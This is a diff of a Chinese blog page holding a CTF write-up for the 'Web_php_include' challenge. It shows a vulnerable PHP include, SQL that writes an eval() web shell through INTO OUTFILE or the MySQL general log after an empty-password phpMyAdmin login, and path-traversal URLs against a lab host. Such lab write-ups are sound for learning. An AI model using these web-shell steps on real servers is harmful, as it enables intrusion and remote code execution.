@@ -21,12 +21,12 @@
     var CONFIG = {"hostname":"guiu.xyz","root":"/","scheme":"Pisces","version":"7.7.1","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":true,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
   </script>
 
-  <meta name="description" content="攻防世界-web进阶-部分writeupWeb_php_include首先打开题目： 123456789&lt;?phpshow_source(__FILE__);echo $_GET[&#39;hello&#39;];$page&#x3D;$_GET[&#39;page&#39;];while (strstr($page, &quot;php:&#x2F;&#x2F;&quot;)) &amp;#123;    $page&#x3D;str_replace(&quot;php:&#x2F;&#x2F;&quot;, &quot;&quot;, $pag">
+  <meta name="description" content="攻防世界-web进阶-部分writeup ¶Web_php_include 首先打开题目： 123456789&lt;?phpshow_source(__FILE__);echo $_GET[&#39;hello&#39;];$page&#x3D;$_GET[&#39;page&#39;];while (strstr($page, &quot;php:&#x2F;&#x2F;&quot;)) &amp;#123;    $page&#x3D;str_replace(&quot;php:&#x2F;&#x2F;&quot;, &quot;&quot;, $">
 <meta property="og:type" content="article">
 <meta property="og:title" content="攻防世界web进阶部分writeup">
 <meta property="og:url" content="http://guiu.xyz/p/5a058727.html">
 <meta property="og:site_name" content="Hcl的个人小站">
-<meta property="og:description" content="攻防世界-web进阶-部分writeupWeb_php_include首先打开题目： 123456789&lt;?phpshow_source(__FILE__);echo $_GET[&#39;hello&#39;];$page&#x3D;$_GET[&#39;page&#39;];while (strstr($page, &quot;php:&#x2F;&#x2F;&quot;)) &amp;#123;    $page&#x3D;str_replace(&quot;php:&#x2F;&#x2F;&quot;, &quot;&quot;, $pag">
+<meta property="og:description" content="攻防世界-web进阶-部分writeup ¶Web_php_include 首先打开题目： 123456789&lt;?phpshow_source(__FILE__);echo $_GET[&#39;hello&#39;];$page&#x3D;$_GET[&#39;page&#39;];while (strstr($page, &quot;php:&#x2F;&#x2F;&quot;)) &amp;#123;    $page&#x3D;str_replace(&quot;php:&#x2F;&#x2F;&quot;, &quot;&quot;, $">
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="http://sz.guiu.xyz/images/2020/02/25/1568474211041.png">
 <meta property="og:image" content="http://sz.guiu.xyz/images/2020/02/25/1568475673813.png">
@@ -255,12 +255,12 @@
     <div class="post-body" itemprop="articleBody">
 
       
-        <h1 id="攻防世界-web进阶-部分writeup"><a href="#攻防世界-web进阶-部分writeup" class="headerlink" title="攻防世界-web进阶-部分writeup"></a>攻防世界-web进阶-部分writeup</h1><h3 id="Web-php-include"><a href="#Web-php-include" class="headerlink" title="Web_php_include"></a>Web_php_include</h3><p>首先打开题目：</p>
+        <h1>攻防世界-web进阶-部分writeup</h1>
+<h3 id="Web-php-include"><a class="header-anchor" href="#Web-php-include">¶</a>Web_php_include</h3>
+<p>首先打开题目：</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">echo</span> $_GET[<span class="string">'hello'</span>];</span><br><span class="line">$page=$_GET[<span class="string">'page'</span>];</span><br><span class="line"><span class="keyword">while</span> (strstr($page, <span class="string">"php://"</span>)) &#123;</span><br><span class="line">    $page=str_replace(<span class="string">"php://"</span>, <span class="string">""</span>, $page);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">include</span>($page);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
 <p>有文件包含，没拿到文件名，而且循环过滤，看起来绕过是不太容易。</p>
 <a id="more"></a>
-
 <p>上扫描器发现phpmyadmin：</p>
 <p><img src="http://sz.guiu.xyz/images/2020/02/25/1568474211041.png" alt="1568474211041.png"></p>
 <p>尝试空密码登录成功：</p>
@@ -269,16 +269,17 @@
 <p><img src="http://sz.guiu.xyz/images/2020/02/25/1568474375962.png" alt="1568474375962.png"></p>
 <p>于是想到两个点可以拿shell：</p>
 <ul>
-<li><p>通过mysql的 outfile写入shell</p>
+<li>
+<p>通过mysql的 outfile写入shell</p>
 </li>
-<li><p>通过日志文件拿shell</p>
+<li>
+<p>通过日志文件拿shell</p>
 </li>
 </ul>
 <p>试下第一种：</p>
 <p>通过phpinfo.php文件查看web目录：</p>
 <p><img src="http://sz.guiu.xyz/images/2020/02/25/1568474907398.png" alt="1568474907398.png"></p>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Drop</span> <span class="keyword">TABLE</span> <span class="keyword">IF</span> <span class="keyword">EXISTS</span> temp; //如果存在temp就删掉</span><br><span class="line"><span class="keyword">Create</span> <span class="keyword">TABLE</span> temp(cmd <span class="built_in">text</span> <span class="keyword">NOT</span> <span class="literal">NULL</span>); //建立temp表，里面就一个cmd字段</span><br><span class="line"><span class="keyword">Insert</span> <span class="keyword">INTO</span> temp (cmd) <span class="keyword">VALUES</span>(<span class="string">'&lt;?php eval($_POST[cmd]); ?&gt;'</span>); //把一句话木马插入到temp表</span><br><span class="line"><span class="keyword">Select</span> cmd <span class="keyword">from</span> temp <span class="keyword">into</span> <span class="keyword">outfile</span> <span class="string">'/var/www/shell.php'</span>; //查询temp表中的一句话并把结果导入到shell.php</span><br><span class="line"><span class="keyword">Drop</span> <span class="keyword">TABLE</span> <span class="keyword">IF</span> <span class="keyword">EXISTS</span> temp; //删除temp</span><br></pre></td></tr></table></figure>
-
 <p>执行第四行的时候报错：</p>
 <p><img src="http://sz.guiu.xyz/images/2020/02/25/1568475721502.png" alt="1568475721502.png"></p>
 <p>没权限，换tmp目录，然后首页包含：</p>
@@ -286,13 +287,9 @@
 <p><img src="http://sz.guiu.xyz/images/2020/02/25/1568476050893.png" alt="1568476050893.png"></p>
 <p>payload:</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;111.198.29.45:37211&#x2F;index.php?page&#x3D;..&#x2F;..&#x2F;..&#x2F;..&#x2F;tmp&#x2F;payload.php</span><br></pre></td></tr></table></figure>
-
-
-
-<h3 id="phpmyadmin通过日志拿shell"><a href="#phpmyadmin通过日志拿shell" class="headerlink" title="phpmyadmin通过日志拿shell:"></a>phpmyadmin通过日志拿shell:</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">set <span class="keyword">global</span> general_log=<span class="string">'on'</span> </span><br><span class="line">set <span class="keyword">global</span> general_log_file=<span class="string">'/tmp/log.php'</span></span><br><span class="line">select <span class="string">"&lt;?php eval($_POST[cmd])?&gt;"</span></span><br></pre></td></tr></table></figure>
-
+<h3 id="phpmyadmin通过日志拿shell"><a class="header-anchor" href="#phpmyadmin通过日志拿shell">¶</a>phpmyadmin通过日志拿shell:</h3>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">set <span class="keyword">global</span> general_log=<span class="string">'on'</span> </span><br><span class="line">set <span class="keyword">global</span> general_log_file=<span class="string">'/tmp/log.php'</span></span><br><span class="line">select <span class="string">"&lt;?php eval($_POST[cmd])?&gt;"</span></span><br></pre></td></tr></table></figure>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;111.198.29.45:37211&#x2F;index.php?page&#x3D;..&#x2F;..&#x2F;..&#x2F;..&#x2F;tmp&#x2F;log.php</span><br></pre></td></tr></table></figure>
-
 <p><img src="http://sz.guiu.xyz/images/2020/02/25/1568476369973.png" alt="1568476369973.png"></p>
 
     </div>
@@ -397,7 +394,7 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
-          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#攻防世界-web进阶-部分writeup"><span class="nav-number">1.</span> <span class="nav-text">攻防世界-web进阶-部分writeup</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Web-php-include"><span class="nav-number">1.0.1.</span> <span class="nav-text">Web_php_include</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#phpmyadmin通过日志拿shell"><span class="nav-number">1.0.2.</span> <span class="nav-text">phpmyadmin通过日志拿shell:</span></a></li></ol></li></ol></li></ol></div>
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#null"><span class="nav-number">1.</span> <span class="nav-text">攻防世界-web进阶-部分writeup</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Web-php-include"><span class="nav-number">1.0.1.</span> <span class="nav-text">¶Web_php_include</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#phpmyadmin通过日志拿shell"><span class="nav-number">1.0.2.</span> <span class="nav-text">¶phpmyadmin通过日志拿shell:</span></a></li></ol></li></ol></li></ol></div>
       </div>
       <!--/noindex-->
 
